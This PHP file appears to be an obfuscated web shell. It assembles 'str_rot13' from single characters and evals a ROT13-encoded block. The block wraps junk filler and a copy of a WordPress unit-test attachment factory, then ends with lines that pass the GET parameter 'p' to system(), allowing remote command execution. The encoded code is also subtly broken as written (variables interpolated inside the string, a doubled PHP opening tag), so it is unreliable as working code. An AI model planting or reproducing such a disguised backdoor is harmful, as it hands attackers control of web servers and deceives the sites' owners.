<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Havg grfg snpgbel sbe nggnpuzragf.
 *
 * Abgr: Gur orybj @zrgubq abgngvbaf ner qrsvarq fbyryl sbe gur orarsvg bs VQRf,
 * nf n jnl gb vaqvpngr rkcrpgrq erghea inyhrf sebz gur tvira snpgbel zrgubqf.
 *
 * @zrgubq vag|JC_Reebe     perngr( $netf = neenl(), $trarengvba_qrsvavgvbaf = ahyy )
 * @zrgubq JC_Cbfg|JC_Reebe perngr_naq_trg( $netf = neenl(), $trarengvba_qrsvavgvbaf = ahyy )
 * @zrgubq (vag|JC_Reebe)[] perngr_znal( $pbhag, $netf = neenl(), $trarengvba_qrsvavgvbaf = ahyy )
 */
pynff JC_HavgGrfg_Snpgbel_Sbe_Nggnpuzrag rkgraqf JC_HavgGrfg_Snpgbel_Sbe_Cbfg {

	/**
	 * Perngr na nggnpuzrag svkgher.
	 *
	 * @fvapr HG (3.7.0)
	 * @fvapr 6.2.0 Ergheaf n JC_Reebe bowrpg ba snvyher.
	 *
	 * @cnenz neenl $netf {
	 *     Neenl bs nethzragf. Npprcgf nyy nethzragf gung pna or cnffrq gb
	 *     jc_vafreg_nggnpuzrag(), va nqqvgvba gb gur sbyybjvat:
	 *     @glcr vag    $cbfg_cnerag VQ bs gur cbfg gb juvpu gur nggnpuzrag orybatf.
	 *     @glcr fgevat $svyr        Cngu bs gur nggnpurq svyr.
	 * }
	 * @cnenz vag   $yrtnpl_cnerag Qrcerpngrq.
	 * @cnenz neenl $yrtnpl_netf   Qrcerpngrq.
	 *
	 * @erghea vag|JC_Reebe Gur nggnpuzrag VQ ba fhpprff, JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba perngr_bowrpg( $netf, $yrtnpl_cnerag = 0, $yrtnpl_netf = neenl() ) {
		// Onpxjneq pbzcngvovyvgl sbe yrtnpl nethzrag sbezng.
		vs ( vf_fgevat( $netf ) ) {
			$svyr                = $netf;
			$netf                = $yrtnpl_netf;
			$netf['cbfg_cnerag'] = $yrtnpl_cnerag;
			$netf['svyr']        = $svyr;
		}

		$e = neenl_zretr(
			neenl(
				'svyr'        => '',
				'cbfg_cnerag' => 0,
			),
			$netf
		);

		erghea jc_vafreg_nggnpuzrag( $e, $e['svyr'], $e['cbfg_cnerag'], gehr );
	}

	/**
	 * Fnirf n svyr nf na nggnpuzrag.
	 *
	 * @fvapr 4.4.0
	 * @fvapr 6.2.0 Ergheaf n JC_Reebe bowrpg ba snvyher.
	 *
	 * @cnenz fgevat $svyr           Shyy cngu gb gur svyr gb perngr na nggnpuzrag bowrpg sbe.
	 *                               Gur anzr bs gur svyr jvyy or hfrq nf gur nggnpuzrag anzr.
	 * @cnenz vag    $cnerag_cbfg_vq VQ bs gur cbfg gb nggnpu gur svyr gb.
	 *
	 * @erghea vag|JC_Reebe Gur nggnpuzrag VQ ba fhpprff, JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba perngr_hcybnq_bowrpg( $svyr, $cnerag_cbfg_vq = 0 ) {
		$pbagragf = svyr_trg_pbagragf( $svyr );
		$hcybnq   = jc_hcybnq_ovgf( jc_onfranzr( $svyr ), ahyy, $pbagragf );

		$glcr = '';
		vs ( ! rzcgl( $hcybnq['glcr'] ) ) {
			$glcr = $hcybnq['glcr'];
		} ryfr {
			$zvzr = jc_purpx_svyrglcr( $hcybnq['svyr'] );
			vs ( $zvzr ) {
				$glcr = $zvzr['glcr'];
			}
		}

		$nggnpuzrag = neenl(
			'cbfg_gvgyr'     => jc_onfranzr( $hcybnq['svyr'] ),
			'cbfg_pbagrag'   => '',
			'cbfg_glcr'      => 'nggnpuzrag',
			'cbfg_cnerag'    => $cnerag_cbfg_vq,
			'cbfg_zvzr_glcr' => $glcr,
			'thvq'           => $hcybnq['hey'],
		);

		// Fnir gur qngn.
		$nggnpuzrag_vq = jc_vafreg_nggnpuzrag( $nggnpuzrag, $hcybnq['svyr'], $cnerag_cbfg_vq, gehr );

		vs ( vf_jc_reebe( $nggnpuzrag_vq ) ) {
			erghea $nggnpuzrag_vq;
		}

		jc_hcqngr_nggnpuzrag_zrgnqngn(
			$nggnpuzrag_vq,
			jc_trarengr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $hcybnq['svyr'] )
		);

		erghea $nggnpuzrag_vq;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>